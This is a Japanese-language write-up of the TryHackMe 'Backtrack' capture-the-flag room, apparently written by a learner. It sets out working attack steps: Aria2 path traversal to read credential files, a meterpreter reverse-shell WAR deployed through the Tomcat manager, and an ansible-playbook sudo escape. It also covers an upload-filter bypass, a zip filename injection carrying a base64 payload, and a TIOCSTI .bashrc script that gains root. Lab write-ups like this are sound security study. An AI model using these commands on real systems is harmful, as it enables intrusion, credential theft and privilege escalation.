# Backtrack CTF

https://tryhackme.com/room/backtrack

## Enumeration

```shell
TARGET=10.48.148.225
sudo bash -c "echo $TARGET   backtrack >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 64
6800/tcp open  unknown        syn-ack ttl 64
8080/tcp open  http-proxy     syn-ack ttl 64
8888/tcp open  sun-answerbook syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,6800,8080,8888 $TARGET

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6800/tcp open  http            aria2 downloader JSON-RPC
8080/tcp open  http            Apache Tomcat 8.5.93
8888/tcp open  sun-answerbook?
```

SSH, HTTP。8888は実際にアクセスすると、`Aria2 WebUI` が表示される。

```sh
root@ip-10-48-69-97:~# nikto -p 8080 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.148.225
+ Target Hostname:    backtrack
+ Target Port:        8080
+ Start Time:         2025-12-06 23:46:45 (GMT0)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1692830594000 
+ OSVDB-39272: favicon.ico file identifies this server as: Apache Tomcat
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Uncommon header 'x-frame-options' found, with contents: DENY
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ 1707 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2025-12-06 23:46:49 (GMT0) (4 seconds)
---------------------------------------------------------------------------
```

PUT, DELETE が許可されているが、実際PUTするとNot Allowedになる。

```sh
$ curl -X PUT --upload-file pentest.php http://backtrack:8080/
<!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Description</b> The method received in the request-line is known by the origin server but not supported by the target resource.</p><hr class="line" /><h3>Apache Tomcat/8.5.93</h3></body></html>
```

### ディレクトリ列挙

```sh
dirb http://backtrack:8080

---- Scanning URL: http://backtrack:8080/ ----
+ http://backtrack:8080/docs (CODE:302|SIZE:0)                                                                            
+ http://backtrack:8080/examples (CODE:302|SIZE:0)                                                                        
+ http://backtrack:8080/favicon.ico (CODE:200|SIZE:21630)                                                                 
+ http://backtrack:8080/host-manager (CODE:302|SIZE:0)                                                                    
+ http://backtrack:8080/manager (CODE:302|SIZE:0)                                                                         
                                                                                                                          
-----------------
```

/host-manager, /manager にアクセスすると、Basic認証が表示された。

## Aria2 WebUI 8888

URI指定すると、kaliでホストしているファイルをダウンロードさせることができる。  
保存先は `/opt/aria2`  
相対パス指定で任意のファイルを保存できないか考えたが、アイデアが無い。

Aria2 WebUI のエクスプロイトを検索したところ、次の記事を発見した。  
https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e

/etc/passwd を読むことに成功した。

```sh
$ curl --path-as-is http://backtrack:8888/../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:122:MySQL Server,,,:/nonexistent:/bin/false
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
```

tomcat の認証情報を入手。

```sh
$ curl --path-as-is http://backtrack:8888/../../../opt/tomcat/conf/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="[REDACTED]" roles="manager-script"/>

</tomcat-users>
```

"manager-script" なので、CUIでのデプロイが可能。

アプリのリスト。reverse_shell がある。

```sh
$ curl -u tomcat:[REDACTED] "http://backtrack:8080/manager/text/list"
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:examples
/reverse_shell:running:0:reverse_shell
/host-manager:running:0:host-manager
/manager:running:0:manager
/docs:running:0:docs
```

warリバースシェルを作成

```sh
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.138.236 LPORT=8888 -f war > shell.war
```

```sh
# デプロイ
curl -u tomcat:[REDACTED] -T shell.war "http://backtrack:8080/manager/text/deploy?path=/shell&update=true"

# リロード
curl -u tomcat:[REDACTED] "http://backtrack:8080/manager/text/reload?path=/shell"
```

実行

```sh
$ curl -u tomcat:[REDACTED] "http://backtrack:8080/shell/jhcmyhedkwtvsw.jsp" -v
* Host backtrack:8080 was resolved.
* IPv6: (none)
* IPv4: 10.48.143.64
*   Trying 10.48.143.64:8080...
* Connected to backtrack (10.48.143.64) port 8080
* using HTTP/1.x
* Server auth using Basic with user 'tomcat'
> GET /shell/jhcmyhedkwtvsw.jsp HTTP/1.1
> Host: backtrack:8080
> Authorization: Basic dG9tY2F0Ok9QeDUyazUzRDhPa1RacHg0ZnI=
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 
< Set-Cookie: JSESSIONID=2E1BAABBF7BC112535A36D97A7FD0CC7; Path=/shell; HttpOnly
< Content-Type: text/html;charset=ISO-8859-1
< Content-Length: 2
< Date: Sun, 07 Dec 2025 01:15:28 GMT
< 


* Connection #0 to host backtrack left intact
```

成功。

```sh
$ msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.138.236; set LPORT 8888;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
LHOST => 192.168.138.236
LPORT => 8888
[*] Started reverse TCP handler on 192.168.138.236:8888 
[*] Sending stage (3090404 bytes) to 10.48.143.64
[*] Meterpreter session 1 opened (192.168.138.236:8888 -> 10.48.143.64:50368) at 2025-12-06 20:15:33 -0500

meterpreter > 
```

## 権限昇格１

wilbur として ansible-playbook コマンドを実行可能。
```sh
sudo -l
Matching Defaults entries for tomcat on Backtrack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
```

エクスプロイト

```sh
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /opt/test_playbooks/../../tmp/test.yml

chmod 666 /tmp/test.yml

sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/test.yml
```

昇格成功。

```sh
$ uid=1004(wilbur) gid=1004(wilbur) groups=1004(wilbur)
```

```sh
$ ls -al
ls -al
total 28
drwxrwx--- 3 wilbur wilbur 4096 Dec  7 01:25 .
drwxr-xr-x 4 root   root   4096 Mar  9  2024 ..
drwxrwxr-x 3 wilbur wilbur 4096 Dec  7 01:25 .ansible
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .bash_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 3771 Mar  9  2024 .bashrc
-rw------- 1 wilbur wilbur   48 Mar  9  2024 .just_in_case.txt
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 1010 Mar  9  2024 .profile
-rw------- 1 wilbur wilbur  461 Mar  9  2024 from_orville.txt
```

wilburの認証情報を発見。

```sh
$ cat .just_in_case.txt
cat .just_in_case.txt
in case i forget :

wilbur:[REDACTED]
```

flag1.txt 発見。

```sh
/opt/tomcat/flag1.txt
```

## 権限昇格２

ローカルでリッスンしているアプリケーションがあるとのこと。

```sh
$ cat from_orville.txt
cat from_orville.txt
Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : [REDACTED]
```

80 ポートをローカルでリッスンしている。

```sh
wilbur@Backtrack:~$ ss -nltp
State       Recv-Q      Send-Q                 Local Address:Port              Peer Address:Port      Process      
LISTEN      0           511                        127.0.0.1:80                     0.0.0.0:*                      
LISTEN      0           1024                         0.0.0.0:6800                   0.0.0.0:*                      
LISTEN      0           4096                   127.0.0.53%lo:53                     0.0.0.0:*                      
LISTEN      0           128                          0.0.0.0:22                     0.0.0.0:*                      
LISTEN      0           70                         127.0.0.1:33060                  0.0.0.0:*                      
LISTEN      0           151                        127.0.0.1:3306                   0.0.0.0:*                      
LISTEN      0           100                                *:8080                         *:*                      
LISTEN      0           1024                            [::]:6800                      [::]:*                      
LISTEN      0           128                             [::]:22                        [::]:*                      
LISTEN      0           511                                *:8888                         *:*                      
LISTEN      0           1                 [::ffff:127.0.0.1]:8005                         *:*
```

80ポートをトンネリング

```sh
ssh -L 80:localhost:80 wilbur@backtrack -N
```

/login.php で、入手した認証情報を使ってログインできた。アップロード機能を狙う。

- PHPファイルをアップロードしようとしたら、`Only JPG, JPEG, PNG, and GIF files are allowed.`
- マジックナンバーの改ざんは機能しなかった。
- pentest.jpg.php としたらアップロードできたが、アクセスしたらファイルダウンロードされただけだった。
- pentest.php.jpg は`Only JPG, JPEG, PNG, and GIF files are allowed.`
- 画像アップロードで、`Content-Type: text/x-php` に変更してもエラーにならなかったので、Content-Typeによるフィルターは存在しない。
- でたらめな拡張子にすると`Only JPG, JPEG, PNG, and GIF files are allowed.`になるので、拡張子によるホワイトリスト。

`%2e%2e%2fpentest3.jpg.php` とすると、`pentest3.jpg.php` が保存された。../ がフィルターで削除されているのではないかと考えた。

`%2e%2e%2e%2e%2f%2fpentest.jpg.php` とするとアップロードできた。

```sh
$ nc -lnvp 8888         
listening on [any] 8888 ...
connect to [192.168.138.236] from (UNKNOWN) [10.48.184.114] 41400
Linux Backtrack 5.4.0-173-generic #191-Ubuntu SMP Fri Feb 2 13:55:07 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 02:34:47 up  1:46,  1 user,  load average: 0.06, 0.15, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
wilbur   pts/0    192.168.138.236  00:54   54:44   0.04s  0.04s -bash
uid=1003(orville) gid=1003(orville) groups=1003(orville)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1003(orville) gid=1003(orville) groups=1003(orville)
```

## 権限昇格３

zipを展開したらDBのパスワードがあったが、DBを見ても何もなかった。  
SSH接続のパスワードとしても機能しない。

```sh
orville@Backtrack:/home/orville$ cat ./var/www/html/includes/db.php 
<?php
$host = 'localhost';
$dbname = 'backtrack';
$username = 'orville';
$password = '3uK32VD7YRtVHsrehoA3';

try {
    $db = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
    die();
}
?>
```

pspyでプロセスを監視すると、次のようなパターンが繰り返されている。

```sh
2025/12/08 02:51:01 CMD: UID=0     PID=18733  | /usr/sbin/CRON -f 
2025/12/08 02:51:01 CMD: UID=0     PID=18735  | 
2025/12/08 02:51:01 CMD: UID=0     PID=18734  | /bin/sh -c systemctl restart manage 

2025/12/08 02:51:01 CMD: UID=0     PID=18736  | /usr/bin/python3 /root/manage.py

2025/12/08 02:51:02 CMD: UID=1003  PID=18840  | su - orville 
2025/12/08 02:51:02 CMD: UID=1003  PID=18841  | groups 
2025/12/08 02:51:02 CMD: UID=1003  PID=18842  | -bash 
2025/12/08 02:51:02 CMD: UID=1003  PID=18844  | -bash 
2025/12/08 02:51:02 CMD: UID=1003  PID=18843  | locale 
2025/12/08 02:51:02 CMD: UID=1003  PID=18845  | -bash 
2025/12/08 02:51:02 CMD: UID=1003  PID=18846  | /bin/sh /usr/bin/lesspipe 
2025/12/08 02:51:02 CMD: UID=1003  PID=18848  | /bin/sh /usr/bin/lesspipe 
2025/12/08 02:51:02 CMD: UID=1003  PID=18847  | /bin/sh /usr/bin/lesspipe 
2025/12/08 02:51:02 CMD: UID=1003  PID=18849  | -bash 
2025/12/08 02:51:05 CMD: UID=1003  PID=18850  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/pentest4.jpg.php /var/www/html/register.php /var/www/html/uploads
```

manageサービス

```sh
orville@Backtrack:/home/orville$ systemctl cat manage
# /etc/systemd/system/manage.service
[Unit]
Description=Cleaning Web-App

[Service]
Type=simple
ExecStart=/usr/bin/python3 /root/manage.py
WorkingDirectory=/root
User=root

[Install]
WantedBy=multi-user.target
```

自分がアップロードした`/var/www/html/pentest4.jpg.php`が表示されていることから、おそらく次のような形でzipコマンドが実行されていると思われる。  
ただ、そもそもが orville として実行されているので /root の中からコピーさせるようなことはできない。

```sh
zip -q -r /home/orville/web_snapshot.zip /var/www/html/*
```

```sh
orville@Backtrack:/home/orville$ touch "/var/www/html/-T -TT 'exit; echo Y3AgL3Vzci9iaW4vYmFzaCAvaG9tZS9vcnZpbGxlL2Jhc2g7Y2htb2QgK3N4IC9ob21lL29ydmlsbGUvYmFzaDsK|base64 -d|bash'"
orville@Backtrack:/home/orville$ ls -al /var/www/html
total 48
-rw-rw-rw- 1 orville orville     0 Dec  8 03:40 '-T -TT '\''exit; echo Y3AgL3Vzci9iaW4vYmFzaCAvaG9tZS9vcnZpbGxlL2Jhc2g7Y2htb2QgK3N4IC9ob21lL29ydmlsbGUvYmFzaDsK|base64 -d|bash'\'''
drwxrwx--- 5 orville www-data 4096 Dec  8 03:40  .
drwxr-xr-x 3 root    root     4096 Mar  9  2024  ..
drwxrwx--- 2 orville www-data 4096 Mar 13  2024  css
-rw-rw-r-- 1 orville orville  2770 Oct  2  2023  dashboard.php
drwxrwx--- 2 orville www-data 4096 Mar 13  2024  includes
-rw-rw-r-- 1 orville orville   822 Oct  2  2023  index.php
-rw-rw-r-- 1 orville orville  1693 Oct  2  2023  login.php
-rw-rw-r-- 1 orville orville   220 Jun 24  2023  logout.php
-rw-rw-r-- 1 orville orville  1281 Oct  2  2023  navbar.php
-rw-r--r-- 1 orville orville  2594 Dec  8 03:39  pentest.jpg.php
-rw-rw-r-- 1 orville orville   334 Sep 28  2023  register.php
drwxrwx--- 2 orville www-data 4096 Aug 26  2023  uploads
```

ワイルドカードを利用して -T -TT でコマンド実行する方法を試したが、コマンド実行されなかった。

```sh
orville@Backtrack:/home/orville$ touch "/var/www/html/ -T -TT 'exit; echo Y3AgL3Vzci9iaW4vYmFzaCAvaG9tZS9vcnZpbGxlL2Jhc2g7Y2htb2QgK3N4IC9ob21lL29ydmlsbGUvYmFzaDsK|base64 -d|bash'"
```

```sh
2025/12/08 03:49:05 CMD: UID=1003  PID=3191   | zip -q -r /home/orville/web_snapshot.zip /var/www/html/ -T -TT 'exit; echo Y3AgL3Vzci9iaW4vYmFzaCAvaG9tZS9vcnZpbGxlL2Jhc2g7Y2htb2QgK3N4IC9ob21lL29ydmlsbGUvYmFzaDsK|base64 -d|bash' /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/pentest.jpg.php /var/www/html/register.php /var/www/html/uploads
```

ここで行き詰まったのでウォークスルーを見た。  
https://0xb0b.gitbook.io/writeups/tryhackme/2024/backtrack#shell-as-root

exitだとプロセスが終了してしまうが、SIGSTOPを送ることで親プロセスに戻ることができる。

```python
import os
import signal

os.kill(os.getppid(), signal.SIGSTOP)
```

bash に SUIDを付ける。

```sh
$ cat back2root.py 
#!/usr/bin/env python3
import fcntl
import termios
import os
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```

.bashrc でPythonを実行。

```sh
orville@Backtrack:/home/orville$ echo 'python3 /home/orville/back2root.py' >> /home/orville/.bashrc
```

SUID付与成功

```sh
orville@Backtrack:/home/orville$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

```sh
wilbur@Backtrack:~$ bash -p
bash-5.0# ls -al /root
```

## 振り返り

- root昇格の部分は自力で解決できなかったが、これは知らないと厳しいタイプだったと思う。良い学びになった。
- .bashrc をトリガーに使えるのは、`su - orville` で `-` を指定しているため。環境が全て切り替え先のユーザーに切り替わるため、.bashrc が実行される。
- 下記の形をTIOCSTI（Terminal Inject Characters）攻撃という。この形でコマンドを実行できるのはrootのみ。

```python
for char in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```

## Tags

#tags:Aria2 #tags:アップロードフィルターバイパス #tags:su
